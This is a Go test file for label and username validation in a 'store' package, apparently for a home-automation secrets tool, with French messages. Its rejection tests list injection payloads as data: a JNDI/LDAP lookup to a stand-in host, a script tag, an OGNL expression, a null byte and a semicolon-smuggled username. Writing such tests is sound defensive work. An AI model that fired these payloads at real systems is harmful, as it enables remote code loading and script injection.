package store

import (
	"errors"
	"strings"
	"testing"
)

// Every human-readable label follows one rule, so it is tested once.

func TestLabelAcceptsWhatPeopleWrite(t *testing.T) {
	for _, text := range []string{
		"Mot de passe MQTT",
		"Home Assistant",
		"Clé de l'oncle Léon",
		"Caméra (garage)",
		"Sauvegardes @ maison",
		"Budget $ 2026",
		"Domotique & caméras",
		"Coffre [essai]",
		"",
	} {
		if err := ValidLabel("le champ", text); err != nil {
			t.Errorf("le libellé %q est refusé : %v", text, err)
		}
	}
}

func TestLabelRefusesPayloadsAndLength(t *testing.T) {
	for _, text := range []string{
		"${jndi:ldap://mechant.example/a}",
		"<script>alert(1)</script>",
		"%{#context['x']=false}",
		"deux\nlignes",
		"nul\x00octet",
		"`backticks`",
		strings.Repeat("a", MaxLabelLength+1),
	} {
		if err := ValidLabel("le champ", text); err == nil {
			t.Errorf("le libellé %q est accepté", text)
		} else if !errors.Is(err, ErrLabel) {
			t.Errorf("le libellé %q donne %v, attendu ErrLabel", text, err)
		}
	}
}

// A username is typed at a prompt and stands beside every line of the journal,
// so it is stricter than a label: no spaces, no accents, no look-alikes.
func TestUsernameIsStricterThanALabel(t *testing.T) {
	for _, ok := range []string{"cyril", "alice.martin", "bob_2", "home-assistant"} {
		if err := ValidUsername(ok); err != nil {
			t.Errorf("le nom %q est refusé : %v", ok, err)
		}
	}
	for _, bad := range []string{
		"", "avec espace", "accentué", "cyril;drop", "a" + strings.Repeat("b", MaxUsernameLength),
	} {
		if err := ValidUsername(bad); err == nil {
			t.Errorf("le nom %q est accepté", bad)
		}
	}
}
